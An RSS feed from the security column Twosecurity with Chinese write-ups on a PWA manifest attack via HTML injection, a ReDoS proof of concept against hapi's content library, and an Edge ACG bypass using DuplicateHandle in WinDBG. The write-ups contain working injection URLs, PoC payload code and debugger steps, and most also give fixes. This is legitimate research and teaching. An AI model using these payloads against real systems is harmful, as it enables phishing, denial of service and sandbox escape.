<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>Twosecurity</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/</link>
<description>twosecurity.io</description>
<language>zh-cn</language>
<lastBuildDate>Fri, 13 Oct 2017 02:23:42 +0800</lastBuildDate>
<item>
<title>PWA-Progressive Web Attack</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-10-11-30036967.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;PWA-Progressive Web Attack&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30036967&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;今天，我将要讲述的是有关 PWA(Progressive Web Apps，即网页版App)的相关内容.&lt;/p&gt;&lt;p&gt;近些日子以来，随着 CSP（内容安全策略）的运用和帮助，缓解了很大一部分潜在的跨站脚本问题，网站通过 CSP将 XSS(跨站脚本攻击)转换成 HTML注入，安全性能得到提升。有时甚至在面对存在 XSS漏洞的却没有使用CSP的现代网页时，我们也可能感到束手无策。&lt;/p&gt;&lt;p&gt;但是，假如出现了一种可以仅通过 HTML注入，就可以在浏览器管理系统原生界面安装APP的方式呢？&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Progressive Web Apps&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;PWA是一种拥有响应用户和离线功能（运用 Service Worker，Cache API等）的网页应用程序，这也就意味着它和原生应用程序非常地接近。&lt;/p&gt;&lt;p&gt;但是，请想一想，我们能够通过 Application Cache来实现它吗？答案是肯定的，因为 PWA是可以在 Web APP Manifest的运用下实现安装的。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Progressive Web Attack&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Web App Manifest很特殊，它具备在浏览器管理原生界面中触发 PWA安装提示的功能。使用一个指向符合跨域（任何类型）的 Manifest文件链接标签就可以轻易实现。&lt;/p&gt;&lt;p&gt;那么让我们来看看该如何利用这个特性？&lt;/p&gt;&lt;p&gt;假设受害站点具备离线功能并且检测出在 Service Worker服务范围的网页中存在 XSS漏洞，但是却在该站点中使用了相当严格的 CSP。&lt;/p&gt;&lt;p&gt;Victim site：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://pwa.shhnjk.com/&lt;/code&gt;&lt;p&gt;Vulnerable page：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://pwa.shhnjk.com/profile.php?name=Guest&lt;/code&gt;&lt;p&gt;And here is how to trigger installation prompt.&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://pwa.shhnjk.com/profile.php?name=%3C/title%3E%3Clink%20rel=manifest%20href=//attack.shhnjk.com/manifest.txt%3E%3C/head%3E%3Cbody%3E%3Ch1%3EHey!%20Try%20our%20New%20App!%3C!--&lt;/code&gt;&lt;p&gt;首先，确定进入了主页面来保证 Servive Worker已注册,然后接下来，使用 Andriod系统的Chrome浏览器进入上述的网址，你会看到下面的情况：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-8f6ecb47707fa4a8186b7fe6579a7bc4_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;323&quot; data-rawheight=&quot;505&quot;&gt;&lt;p&gt;点击 “Add”（不好意思，我的手机默认语言为日语，即上图“追加”）按钮时会开启下载内容并在手机的桌面创建图标，当你打开这个 App，你就会看到下面的页面：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://pwa.shhnjk.com/profile.php?name=%3C/title%3E%3C/head%3E%3Cbody%3E%3Ciframe%20frameBorder=%220%22%20width=%22100%%22%20height=%22100%%22%20src=%22//attack.shhnjk.com/success.html%22%3E&lt;/code&gt;&lt;p&gt;该页面是框架攻击者设置的页面.由于 app的起始页面受到了攻击者的 manifest文件的控制并且只具有攻击者提供的导航功能（没有地址栏，后退或者转发的按钮），使用者将完全陷入攻击者的控制当中。和原始受害站点告别，用户将从现在起陷入攻击！&lt;/p&gt;&lt;p&gt;这一切都仅仅是在 HTML注入的方式下实现的。&lt;/p&gt;&lt;p&gt;顺便说一句，我认为浏览器提供的安装提示不是很安全，它在提示给用户时只会显示顶层域，因此任何允许将用户内容上传到子域的网站（例如 Shopify）就可被用于钓鱼攻击。&lt;/p&gt;&lt;p&gt;无论如何，以下有几点是该项技术的限制：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;指向 manifest文件的 link标签需要包含在head标签内。&lt;/li&gt;&lt;li&gt;start_url需要与受害站点同源。&lt;/li&gt;&lt;li&gt;即使在 app内部，将顶级文档导航到跨原始站点也将触发地址栏,甚至在应用程序中的显示。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;最后一点，我认为 manifest文件仅仅应该在符合同源的情况下被接受，规格也需要得到更加仔细的思考（希望能够得到改变）&lt;/p&gt;&lt;p&gt;为了防止这种类型的攻击，请确保使用安全的下载源或在不使用 PWA(和 AppCache)的情况下将 CSP中的 manifest-src设置为“none”。 &lt;/p&gt;&lt;p&gt;希望你们能够喜欢我的分享。&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-10-11-30036967</guid>
<pubDate>Wed, 11 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>基于正则表达式的 DDoS 及实例讲解</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-10-07-29920988.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;基于正则表达式的 DDoS 及实例讲解&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29920988&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在之前的&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28424183&quot;&gt;文章&lt;/a&gt;中，我们讲解过基于hash的 DoS 攻击。这篇文章中，我们将带来基于正则表达式类型的（Regular Expression）拒绝服务攻击的讲解。最后，我们用 hapi 框架的一个漏洞作为实例解析。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;什么是 ReDoS？&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;当一个正则表达式包含了冗余的匹配，那么它就极有可能引发 ReDoS（即:基于正则表达式的拒绝服务攻击）。由于过多的匹配，正则引擎的匹配速度会飞速下滑。就拿 &lt;b&gt;(a+)+ &lt;/b&gt;来说，当我们输入 &lt;b&gt;aa &lt;/b&gt;时，正则引擎会匹配成 &lt;b&gt;(a)(a)&lt;/b&gt; 或者&lt;b&gt; (aa)&lt;/b&gt;。如果我们输入了 &lt;b&gt;aaa&lt;/b&gt;，正则引擎就会查询&lt;b&gt;(aaa)&lt;/b&gt;，&lt;b&gt;(aa)(a)&lt;/b&gt;，&lt;b&gt;(a)(aa)&lt;/b&gt;，甚至是 &lt;b&gt;(a)(a)(a)&lt;/b&gt;。很明显，我们每多输入一个字母 &lt;b&gt;a&lt;/b&gt;，匹配的数量就要乘以2。不过有一点需要注意，我们最终传递进去的字符最终需要被匹配&lt;b&gt;&lt;i&gt;失败&lt;/i&gt;&lt;/b&gt; ，否则短路效应会直接结束匹配并返回结果，反之则会一直枚举可能的情况。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;寻找问题&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;有了基本知识，让我们来实际操作一下。一个正则表达式如下（最新版本已被修复）：&lt;/p&gt;&lt;code lang=&quot;python3&quot;&gt;/([^\=\*]+)(\*)?\s*\=\s*(?:([^;&#39;]+\&#39;[\w-]*\&#39;[^;\s]+)|(?:\&quot;([^&quot;]*)\&quot;)|([^;\s]*))(?:(?:\s*;\s*)|(?:\s*$))/g&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;看上去很棘手，不过只要问题的核心是冗余的表达式，我们就一定能发现漏洞。我们从头开始，第一个可疑处是 &lt;b&gt;\s*(?:([^;&#39;]+\&#39;[\w-]*\&#39;[^;\s]+)&lt;/b&gt;（排除多余的部分后，我们可以简化其为 &lt;b&gt;\s*[^;&#39;]+&lt;/b&gt;）。用自然语言来描述，大概意思就是找到跟随任意数量空格的非冒号或单引号的一个或多个字符。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在这个 &lt;a href=&quot;https://github.com/hapijs/content&quot;&gt;repo&lt;/a&gt; 中，我们可以得知这个表达式是 content 库用来解析 &lt;b&gt;Content-Dposistion &lt;/b&gt;头中的参数。一个合法的 &lt;b&gt;Content-Dposistion &lt;/b&gt;看上去像：&lt;/p&gt;&lt;p&gt;&lt;b&gt;Content-Disposition:form-data; name=&quot;content&quot;;filename=&quot;hello.txt&quot;&lt;/b&gt;。为了确认这一点，我们来用这个模块解析一下：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&#39;use strict&#39;;
const Content = require(&#39;content&#39;);
const header = &#39;form-data; name=&quot;content&quot;; filename=&quot;hello.txt&quot;&#39;;
console.time(&#39;parse&#39;);
console.log(Content.disposition(header));
console.timeEnd(&#39;parse&#39;);&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;如果你安装了 &lt;a href=&quot;mailto:%60content@3.0.5%60&quot;&gt;content@3.0.5&lt;/a&gt; 或之前的版本，你会得到这个：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;json&quot;&gt;{ name: &#39;content&#39;, filename: &#39;hello.txt&#39; }
parse: 6.200ms
&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们已知可以利用空格，并且构造的payload必须被匹配失败，那么应该如何写出PoC呢？答案很简单，先传入非空格字符，再在后面附加上尽可能多的空格。我们来做个500字的测试：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&#39;use strict&#39;;
const
Content = require(&#39;content&#39;);
const
header = &#39;form-data; x&#39; + new Array(500).join(&#39; &#39;);

console.time(&#39;parse&#39;);
console.log(Content.disposition(header));
console.timeEnd(&#39;parse&#39;);&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这是输出：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;json&quot;&gt;{
Error: Invalid content-disposition header format includes invalid parameters /*
snip */ }
parse:
47.440ms&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;解析速度比原来慢了接近8倍，但总的来说还不算严重。当空格为1000时，解析则花了292ms，当我们再加多1000个空格后，解析器花了2387ms 执行。问题很明显了，不过我们依然不清楚它会有多严重的影响。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;利用content攻击hapi&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Content-Disposition &lt;/b&gt;一般用来告诉客户端响应主体是内联的还是一个附件，有时也用来提供关于multipart form（多重表单）的元数据信息。由于第一个（用途）往往为服务器发出，我们就需要找出使用该框架解析 &lt;b&gt;Content-Disposition &lt;/b&gt;的客户端，而这十分罕见，所以我们不做讨论。不过第二种情况则屡见不鲜，让我们一起研究一下。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;由于hapi使用content，我们就可以用它攻击hapi服务器。首先，我们得模拟接收表单（复现需要&lt;a href=&quot;mailto:hapi@16.5.2&quot;&gt;hapi@16.5.2&lt;/a&gt;及以下的版本）：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&#39;use strict&#39;;
const
Hapi = require(&#39;hapi&#39;);
const
server = new Hapi.Server();

server.connection({
port: 8080 });
server.route({
method: &#39;post&#39;,
path: &#39;/&#39;,
handler: function (request, reply) {
return reply();
}
});

server.start(()
=&amp;gt; {
console.log(&#39;started&#39;);
});&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;现在我们可以开始构造PoC了：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&#39;use strict&#39;;
const
Wreck = require(&#39;wreck&#39;);

const
payload = [
&#39;--123456&#39;,
&#39;content-disposition: form-data; x&#39; + new
Array(2000).join(&#39; &#39;),
&#39;content-type: text/plain&#39;,
&#39;&#39;,
&#39;text&#39;,
&#39;--123456&#39;,
&#39;content-disposition: form-data;
name=&quot;field2&quot;&#39;,
&#39;content-type: text/plain&#39;,
&#39;&#39;,
&#39;text&#39;,
&#39;--123456--&#39;
].join(&#39;\r\n&#39;);

console.time(&#39;req&#39;);
Wreck.post(&#39;http://localhost:8080&#39;,
{ headers: { &#39;content-type&#39;: &#39;multipart/form-data; boundary=123456&#39;,
&#39;content-length&#39;: Buffer.byteLength(payload) }, payload }, (err, res, body)
=&amp;gt; {
console.timeEnd(&#39;req&#39;);
});&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这一段代码跑了 46ms。似乎没有想象中这么慢，让我们看看哪里出来问题。翻了一段又一段的执行链，我们发现 hapi 使用 &lt;a href=&quot;https://github.com/hapijs/subtext&quot;&gt;subtext&lt;/a&gt; 中的 &lt;a href=&quot;https://github.com/hapijs/pez&quot;&gt;pez&lt;/a&gt; 解析payload。pez 会截断一个 header 的结束与另一个 header 的开头之间额外的空格，所以我们需要在空格结尾添加一个字符（用来表示该 header 还没结束）防止空格被移除：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;const payload = [
&#39;--123456&#39;,
&#39;content-disposition: form-data; x&#39; + new
Array(2000).join(&#39; &#39;) + &#39;x&#39;,
&#39;content-type: text/plain&#39;,
&#39;&#39;,
&#39;text&#39;,
&#39;--123456&#39;,
&#39;content-disposition: form-data;
name=&quot;field2&quot;&#39;,
&#39;content-type: text/plain&#39;,
&#39;&#39;,
&#39;text&#39;,
&#39;--123456--&#39;
].join(&#39;\r\n&#39;);&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这个 PoC 则执行了2000多ms，大功告成了！不过我们应该如何修复呢？&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;正确的解析方式&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;前一个式子是因为空格的冗余匹配而导致的，因此，我们只需要在匹配字符时将空格也纳入黑名单即可：&lt;b&gt;\s*[^;&#39;\s]+&lt;/b&gt;，我们先来试试这种简单粗暴的改法：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;/([^\=\*]+)(\*)?\s*\=\s*(?:([^;&#39;\s]+\&#39;[\w-]*\&#39;[^;\s]+)|(?:\&quot;([^&quot;]*)\&quot;)|([^;\s]*))(?:(?:\s*;\s*)|(?:\s*$))/g&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;再运行一次 PoC，结果还是跑了两千多毫秒。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在该表达式开头处，你会看到 &lt;b&gt;[^\=\*]+\s*&lt;/b&gt;。因此，我们还需修正此处：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;/([^\=\*\s]+)(\*)?\s*\=\s*(?:([^;&#39;\s]+\&#39;[\w-]*\&#39;[^;\s]+)|(?:\&quot;([^&quot;]*)\&quot;)|([^;\s]*))(?:(?:\s*;\s*)|(?:\s*$))/g&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;现在，执行一次 PoC 仅需六十多毫秒，终于大功告成了！&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-10-07-29920988</guid>
<pubDate>Sat, 07 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>利用 DuplicateHandle 绕过 Edge 代码执行保护</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-10-03-29859057.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;利用 DuplicateHandle 绕过 Edge 代码执行保护&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29859057&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在这篇文章中，我们将讲解如何绕过 Edge 的 ACG（Arbitrary Code Guard，代码执行保护)。该问题可以在装有Edge 40.15063.0.0 的 Windows 10 企业版（Creator Update，Version 1703, OS build 15063.413）中复现。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;背景&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Edge 通过[分离 JIT（即时编译）](https://bugs.chromium.org/p/project-zero/issues/detail?id=1299)实现 ACG。JIT同时需要映射原生代码到内容进程（Content Process）中。当 JIT 被调用时，它会暴露内容进程和JIT之间通信的 LRPC（轻量级远程过程调用）server。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;为了在调用过程中映射可执行内存，JIT需要（调用JIT的）进程的句柄。它如何得到该句柄呢？该调用进程需要在（伪）句柄中使用DuplicateHandle以将其发送给JIT。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;那么问题来了。在调用DuplicateHandle时，内容进程需要拥有目标进程（此处是JIT)的句柄以及PROCESS_DUP_HANDLE权限 &lt;b&gt;&lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/ms724251.aspx&quot;&gt;参考&lt;/a&gt;&lt;/b&gt;。然而，这也使得内容进程可以完全地控制 JIT。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684880(v=vs.85).aspx&quot;&gt;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684880(v=vs.85).aspx&lt;/a&gt; 是这么描述的：&lt;/p&gt;&lt;blockquote&gt;注意！用户可以通过某些访问权限的进程可以使用它们来获取其它访问权限。假设进程A有进程B的句柄且对其有PROCESS_DUP_HANDLE权限，它就可以创建一个B的伪句柄。该句柄能对B拥有完整控制权。如果你想知道更多有关伪句柄的咨询，请参见GetCurrentProcess。&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;让我们来debug一下：&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;输入以下命令，WinDBG就会开始调试 MicrosoftEdge.exe 和 MicrosoftEdgeCP.exe &lt;/b&gt;&lt;/p&gt;&lt;code lang=&quot;ps1con&quot;&gt;plmdebug.exe /enableDebug Microsoft.MicrosoftEdge_40.15063.0.0_neutral__8wekyb3d8bbwe &quot;c:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg.exe&quot;&lt;/code&gt;&lt;p&gt;&lt;b&gt;打开microsoft-edge: &lt;a href=&quot;http://www.google.com/&quot;&gt;http://www.google.com&lt;/a&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;这时会有两个 MicrosoftEdgeCP.exe，第一个是 JIT 进程，第二个是内容进程&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;用 WinDBG 调试内容进程（在这个例子中，它的 PID 为5104）&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;ca65&quot;&gt;0:000&amp;gt;
bp chakra!ThreadContext::EnsureJITThreadContext
Bp
expression &#39;chakra!ThreadContext::EnsureJITThreadContext&#39; could not be
resolved, adding deferred bp
0:000&amp;gt;
g

...

Breakpoint
0 hit
chakra!ThreadContext::EnsureJITThreadContext:
00007ff8`1a3079a4
488bc4 mov rax,rsp&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;在调用 DuplicateHandle 之前，我设置了额外的断点来捕捉 JIT 的句柄。注意，在真实的环境中，JIT 进程句柄会被存储在内存中，拥有内存读取权限的攻击者能够轻松获得它。即使攻击者不能直接读取句柄，其实也可以通过爆破的方式猜解出句柄（数值非常小)。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;ca65&quot;&gt;0:015&amp;gt;
bp 00007ff8`1a307a4d
0:015&amp;gt;
g
Breakpoint
1 hit
chakra!ThreadContext::EnsureJITThreadContext+0xa9:
00007ff8`1a307a4d
ff1575785b00 call qword ptr [chakra!_imp_DuplicateHandle
(00007ff8`1a8bf2c8)] ds:00007ff8`1a8bf2c8={KERNELBASE!DuplicateHandle
(00007ff8`34408de0)}
0:015&amp;gt;
r
rax=ffffffffffffffff
rbx=ffffffffffffffff rcx=ffffffffffffffff
rdx=ffffffffffffffff
rsi=0000000000000000 rdi=0000000000000960
rip=00007ff81a307a4d
rsp=000000d2717fb9f0 rbp=000000d2717fba99
r8=0000000000000960 r9=000000d2717fba48 r10=00000fff034a85c4
r11=4444455511111111
r12=00000000000004bf r13=0000000000001210
r14=00000251fcb2aa80
r15=00000251fcb2af48&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;JIT 句柄现在被保存到了 r8，当前的值为 0x960。我们继续运行，看看结果。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;0:015&amp;gt;
g

...&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;进程执行一段时间后，我们再次中断并看看句柄是否还在正常运作&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;ca65&quot;&gt;(13f0.16f0):
Break instruction exception - code 80000003 (first chance)
ntdll!DbgBreakPoint:
00007ff8`37d58d70
cc int 3&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;让我们再次调用 DuplicateHandle，但这次要额外设置参数到寄存器/栈中。如下的操作相当于调用 DuplicateHandle(jit_server_handle, GetCurrentProcess(), GetCurrentProcess(), pointer_for_storing_return_value, 0,0, DUPLICATE_SAME_ACCESS)：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;ca65&quot;&gt;0:039&amp;gt;
r
rax=ffffffffffffffff
rbx=ffffffffffffffff rcx=0000000000000960
rdx=ffffffffffffffff
rsi=0000000000000000 rdi=0000000000000000
rip=00007ff81a307a4d
rsp=000000d2731ffb28 rbp=0000000000000000
r8=ffffffffffffffff r9=000000d2731ffc28 r10=00000fff06fb0a64
r11=0222001000880020
r12=0000000000000000 r13=0000000000000000
r14=0000000000000000
r15=0000000000000000
iopl=0 nv up ei ng nz na po nc
cs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000286
chakra!ThreadContext::EnsureJITThreadContext+0xa9:
00007ff8`1a307a4d
ff1575785b00 call qword ptr [chakra!_imp_DuplicateHandle
(00007ff8`1a8bf2c8)] ds:00007ff8`1a8bf2c8={KERNELBASE!DuplicateHandle
(00007ff8`34408de0)}
0:039&amp;gt;
p
chakra!ThreadContext::EnsureJITThreadContext+0xaf:
00007ff8`1a307a53
85c0 test eax,eax
0:039&amp;gt;
r
rax=0000000000000001
rbx=ffffffffffffffff rcx=00007ff837d55b34
rdx=0000000000000000
rsi=0000000000000000 rdi=0000000000000000
rip=00007ff81a307a53
rsp=000000d2731ffb28 rbp=0000000000000000
r8=000000d2731ffad0 r9=0000000000000000 r10=0000000000000000
r11=0000000000000246
r12=0000000000000000 r13=0000000000000000
r14=0000000000000000
r15=0000000000000000
iopl=0 nv up ei pl nz ac pe nc
cs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000212
chakra!ThreadContext::EnsureJITThreadContext+0xaf:
00007ff8`1a307a53
85c0 test eax,eax&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;这次的调用成功了（ DuplicateHandle 返回1)如果你再看看指向第四个参数的内存，你能得到返回的句柄(0xef4)。有了这样的权限，内容进程可以轻易地控制JIT。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;ca65&quot;&gt;0:039&amp;gt;
r rcx=ef4
0:039&amp;gt;
r rip=kernelbase!getprocessid

...

0:039&amp;gt;
r
rax=00000000000010cc
rbx=ffffffffffffffff rcx=00007ff837d556d4
rdx=0000000000000000
rsi=0000000000000000 rdi=0000000000000000
rip=00007ff834459a35
rsp=000000d2731ffac0 rbp=0000000000000000
r8=000000d2731ffab8 r9=0000000000000000 r10=0000000000000000
r11=0000000000000246
r12=0000000000000000 r13=0000000000000000
r14=0000000000000000
r15=0000000000000000
iopl=0 nv up ei pl zr na po nc
cs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246
KERNELBASE!GetProcessId+0x25:
00007ff8`34459a35
4883c468 add rsp,68h&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;GetProcessId 返回了0x10cc（相当于4300），刚好和 JIT 的 PID 对应。让我们试试给 JIT分配内存，不要忘了设置第五个参数（0x4）。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;0:039&amp;gt;
r rcx=ef4
0:039&amp;gt;
r rdx=0
0:039&amp;gt;
r r8=1000
0:039&amp;gt;
r r9=3000
0:039&amp;gt;
r rip=kernelbase!virtualallocex

...

0:039&amp;gt;
r
rax=000001b929730000
rbx=ffffffffffffffff rcx=00007ff837d556b4
rdx=0000000000000000
rsi=0000000000000000 rdi=0000000000000000
rip=00007ff8343fff16
rsp=000000d2731ffa88 rbp=0000000000000000
r8=000000d2731ffa40 r9=0000000000000000 r10=0000000000000000
r11=0000000000000246
r12=0000000000000000 r13=0000000000000000
r14=0000000000000000
r15=0000000000000000
iopl=0 nv up ei pl nz ac pe nc
cs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000212
KERNELBASE!VirtualAllocEx+0x16:
00007ff8`343fff16
4883c438 add rsp,38h&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;成功了！我们现在能在&lt;br&gt;0x1b929730000中给 JIT 分配内存。最后，让我们看看我们是否能在 JIT中写内存。 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;0:039&amp;gt;
r rcx=ef4
0:039&amp;gt;
r rdx=000001b929730000
0:039&amp;gt;
r r8=000000d2`731ffce0
0:039&amp;gt;
r r9=10
0:039&amp;gt;
r rip=kernelbase!writeprocessmemory

...

0:039&amp;gt;
r
rax=0000000000000001
rbx=ffffffffffffffff rcx=0000000000000000
rdx=000000d2731fff00
rsi=0000000000000000 rdi=0000000000000000
rip=00007ff834469af9
rsp=000000d2731ffa88 rbp=0000000000000000
r8=000000d2731ff9e8 r9=000000d2731ffa70 r10=0000000000000000
r11=000000d2731ffa70
r12=0000000000000000 r13=0000000000000000
r14=0000000000000000
r15=0000000000000000
iopl=0 nv up ei pl zr na po nc
cs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246
KERNELBASE!WriteProcessMemory+0xb9:
00007ff8`34469af9
c3 ret&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;再一次！如下截图，现在我们成功地将十六字节的数据写入到了该地址中。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-ef1fc2803d8c1600f7f33e3179e1562d_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1330&quot; data-rawheight=&quot;801&quot;&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-10-03-29859057</guid>
<pubDate>Tue, 03 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>如何利用/防御 Service Worker</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-09-29-29734820.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;如何利用/防御 Service Worker&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29734820&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
